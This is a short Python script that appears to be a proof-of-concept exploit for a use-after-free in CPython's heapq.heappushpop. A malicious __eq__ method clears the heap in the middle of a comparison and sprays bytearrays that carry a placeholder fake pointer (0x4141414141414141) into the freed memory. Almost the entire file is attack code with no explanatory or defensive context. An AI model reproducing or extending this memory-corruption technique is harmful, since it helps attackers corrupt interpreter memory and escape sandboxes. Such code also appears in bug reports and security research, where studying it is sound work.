import heapq

class Evil1:
    def __eq__(self, other):
        print('In Evil1.__eq__')
        
        # Fill tuple free list
        dummy = [(i, i) for i in range(10000)]
        del dummy
        
        # Free top
        heap.clear()
        
        # Spray bytearray of size 79 (allocates 80 bytes)
        fake_pointer = (0x4141414141414141).to_bytes(8, 'little')
        # We need payload[72:79] to be fake_pointer[:7]
        payload = b'A' * 72 + fake_pointer[:7]
        
        global spray
        spray = [bytearray(payload) for _ in range(1000)]
        
        return True

class Evil2:
    def __gt__(self, other):
        print('In Evil2.__gt__')
        return True

heap = [(Evil1(), 0)]

print('Calling heappushpop...')
try:
    heapq.heappushpop(heap, (0, Evil2()))
except Exception as e:
    print('Exception:', e)
print('Done')
